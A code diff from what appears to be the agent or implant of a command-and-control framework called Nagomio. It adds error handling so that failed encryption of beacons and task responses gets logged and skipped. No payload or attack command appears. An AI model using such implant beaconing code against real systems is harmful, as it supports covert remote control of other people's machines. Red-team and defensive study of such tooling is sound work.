@@ -1600,10 +1600,14 @@ static void send_agent_response(const Nagomio::AgentResponse& agent_res,
     if (!config.agent_token.empty()) {
         std::vector<unsigned char> nonce, ct, tag;
         // Agent -> server always uses the agent direction context.
-        nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
-                           std::vector<unsigned char>(res_body.begin(), res_body.end()),
-                           nonce, ct, tag);
-        res_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+        if (nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
+                               std::vector<unsigned char>(res_body.begin(), res_body.end()),
+                               nonce, ct, tag)) {
+            res_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+        } else {
+            std::cerr << "[-] Wire seal failed for agent response; dropping response" << std::endl;
+            return;
+        }
     }
 #endif
 #ifndef _WIN32
@@ -1919,10 +1923,14 @@ int main(int argc, char** argv) {
 #if NAGOMIO_WIRE_ENCRYPTION
         if (!config.agent_token.empty()) {
             std::vector<unsigned char> nonce, ct, tag;
-            nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
-                               std::vector<unsigned char>(beacon_body.begin(), beacon_body.end()),
-                               nonce, ct, tag);
-            beacon_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+            if (nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
+                                   std::vector<unsigned char>(beacon_body.begin(), beacon_body.end()),
+                                   nonce, ct, tag)) {
+                beacon_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+            } else {
+                std::cerr << "[-] Wire seal failed for beacon; skipping cycle" << std::endl;
+                continue;
+            }
         }
 #endif
         // B11: dead-drop profile uses GET and appends the agent_id to the
@@ -2001,10 +2009,14 @@ int main(int argc, char** argv) {
 #if NAGOMIO_WIRE_ENCRYPTION
                         if (!config.agent_token.empty()) {
                             std::vector<unsigned char> nonce, ct, tag;
-                            nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
-                                               std::vector<unsigned char>(res_body.begin(), res_body.end()),
-                                               nonce, ct, tag);
-                            res_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+                            if (nagomio_wire::seal(config.agent_token, "nagomio/agent/v1",
+                                                   std::vector<unsigned char>(res_body.begin(), res_body.end()),
+                                                   nonce, ct, tag)) {
+                                res_body = nagomio_wire::encode_envelope("nagomio/agent/v1", nonce, ct, tag);
+                            } else {
+                                std::cerr << "[-] Wire seal failed for task response; dropping" << std::endl;
+                                continue;
+                            }
                         }
 #endif
                         // A4: fresh HMAC for the response body and path.
